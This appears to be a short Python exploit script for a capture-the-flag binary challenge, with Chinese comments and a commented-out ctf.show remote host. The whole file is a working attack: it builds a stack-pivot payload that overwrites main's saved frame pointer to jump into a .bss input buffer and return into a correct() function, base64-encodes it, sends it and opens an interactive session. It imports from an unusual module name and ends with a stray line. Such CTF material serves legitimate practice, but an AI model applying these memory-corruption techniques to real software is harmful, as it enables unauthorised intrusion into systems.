from kk import *
import base64

context.log_level = 'debug'

io = process('./pwn')
elf = ELF('./pwn')
#io = remote('pwn.challenge.ctf.show', 28258)

input_addr   = 0x811EB40          # 你给的 .bss input 地址
correct_addr = elf.symbols['correct']    # 用 IDA / ELF 确认真实 correct() 地址

raw = flat(
    0xDEADBEEF,    # fake ebp / 同时满足 correct() 的 input 检查
    correct_addr,  # main ret -> correct()
    input_addr     # 覆盖 main ebp -> pivot 到 input
)

payload = base64.b64encode(raw)

io.sendlineafter(b":", payload)
io.interactive()

log_level